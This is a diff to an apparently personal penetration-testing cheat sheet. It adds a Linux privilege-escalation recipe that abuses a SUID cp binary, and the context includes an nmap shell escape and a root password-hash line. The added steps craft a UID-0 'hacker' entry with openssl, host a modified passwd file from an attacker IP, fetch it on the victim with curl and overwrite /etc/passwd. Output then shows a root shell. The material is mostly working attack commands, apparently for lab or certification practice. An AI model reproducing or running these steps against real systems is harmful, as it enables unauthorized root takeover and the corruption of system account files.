@@ -748,7 +748,7 @@ gcc memodipper.c -o memodipper #compile on the target not kali
 root:$1$uF5XC.Im$8k0Gkw4wYaZkNzuOuySIx/:16902:0:99999:7:::                                                                                                              vcsa:!!:15422:0:99999:7:::
 pcap:!!:15422:0:99999:7:::
 ````
-### sudo -l
+### sudo -l / SUID Binaries
 #### (root) NOPASSWD: /usr/bin/nmap
 ````
 bash-3.2$ id     
@@ -764,6 +764,33 @@ nmap> !sh
 sh-3.2# id
 id
 uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
+````
+#### /usr/bin/cp
+````
+find / -perm -4000 -user root -exec ls -ld {} \; 2> /dev/null
+cat /etc/passwd #copy the contents of this file your kali machine
+root:x:0:0:root:/root:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+
+openssl passwd -1 -salt ignite pass123
+$1$ignite$3eTbJm98O9Hz.k1NTdNxe1
+echo 'hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash' >> passwd
+
+cat passwd 
+root:x:0:0:root:/root:/bin/bash
+apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
+hacker:$1$ignite$3eTbJm98O9Hz.k1NTdNxe1:0:0:root:/root:/bin/bash
+python3 -m http.server #Host the new passwd file
+curl http://192.168.119.168/passwd -o passwd #Victim Machine
+cp passwd /etc/passwd #This is where the attack is executed
+
+bash-4.2$ su hacker
+su hacker
+Password: pass123
+
+[root@pain tmp]# id
+id
+uid=0(root) gid=0(root) groups=0(root)
 ````
 ### cat /etc/crontab
 #### bash file
